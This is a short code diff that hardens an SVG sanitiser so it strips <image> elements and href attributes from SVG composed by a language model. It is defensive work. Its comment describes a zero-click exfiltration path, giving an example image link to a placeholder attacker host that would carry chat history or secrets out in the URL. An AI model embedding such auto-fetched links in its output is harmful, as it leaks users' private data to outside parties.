@@ -31,5 +31,13 @@ export function toSafeSvg(value: string | null | undefined): string {
   if (typeof window === 'undefined') return '';
   return DOMPurify.sanitize(value, {
     USE_PROFILES: { svg: true, svgFilters: true },
+    // Zero-click exfiltration guard: this SVG is LLM-composed (untrusted), and
+    // the SVG profile otherwise permits `<image href="https://attacker/?d=…">`,
+    // which the browser AUTO-FETCHES on render — smuggling chat history /
+    // secrets out via the URL with no user action. Legitimate mining visuals
+    // use shapes / paths / text, never a remote raster reference, so forbid the
+    // <image> element and every href attribute outright.
+    FORBID_TAGS: ['image'],
+    FORBID_ATTR: ['href', 'xlink:href'],
   });
 }
